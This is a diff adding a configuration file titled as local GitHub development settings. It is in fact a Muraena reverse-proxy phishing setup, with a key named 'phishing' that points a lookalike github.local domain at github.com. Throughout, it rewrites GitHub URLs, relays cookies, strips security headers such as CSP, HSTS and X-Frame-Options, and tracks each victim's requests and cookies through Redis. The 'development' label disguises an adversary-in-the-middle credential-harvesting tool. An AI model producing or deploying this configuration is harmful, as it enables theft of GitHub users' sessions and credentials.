@@ -1,0 +1,97 @@
+# Local Development Configuration for GitHub
+
+[proxy]
+phishing = "github.local"
+destination = "github.com"
+IP = "0.0.0.0"
+port = 443  # Changed to HTTPS port
+listener = "tcp4"
+skipContentType = []
+
+# Enable SSL/TLS with our certificates
+[tls]
+enable = true
+certificate = "certs/github.local+1.pem"
+key = "certs/github.local+1-key.pem"
+
+[origins]
+externalOriginPrefix = "ext-"
+externalOrigins = [
+    "github.com",
+    "githubusercontent.com",
+    "githubassets.com",
+    "github.githubassets.com"
+]
+
+[transform]
+[transform.base64]
+enable = false
+
+[transform.request]
+headers = ["Cookie", "Referer", "Origin"]
+remove.headers = [
+    "X-Forwarded-Proto",
+    "X-Forwarded-Ssl",
+    "X-Forwarded-Host",
+    "X-Forwarded-For"
+]
+
+[transform.response]
+skipContentType = [
+    "image/jpeg",
+    "image/png",
+    "image/gif",
+    "font/*",
+    "application/javascript",
+    "text/css"
+]
+
+headers = [
+    "Location",
+    "Origin",
+    "Set-Cookie",
+    "Access-Control-Allow-Origin"
+]
+
+remove.headers = [
+    "Content-Security-Policy",
+    "Content-Security-Policy-Report-Only",
+    "X-Frame-Options",
+    "Strict-Transport-Security",
+    "Upgrade-Insecure-Requests"
+]
+
+# Custom content replacements
+customContent = [
+    ["https://github.com", "https://github.local"],
+    ["http://github.com", "https://github.local"],
+    ["https://githubusercontent.com", "https://githubusercontent.local"],
+    ["http://githubusercontent.com", "https://githubusercontent.local"],
+    ["https://githubassets.com", "https://githubassets.local"],
+    ["http://githubassets.com", "https://githubassets.local"],
+    ["//github", "//github.local"],
+    ["//githubassets", "//githubassets.local"],
+    ["//githubusercontent", "//githubusercontent.local"]
+]
+
+[log]
+enable = true
+filePath = "log/muraena.log"
+level = "debug"
+
+[redis]
+host = "muraena-redis"
+port = 6379
+
+[tracking]
+enable = true
+trackRequestCookie = true
+
+[tracking.trace]
+identifier = "_gh"
+validator = "[a-zA-Z0-9]{5}"
+
+[staticServer]
+enable = true
+localPath = "./static/"
+urlPath = "/static" 
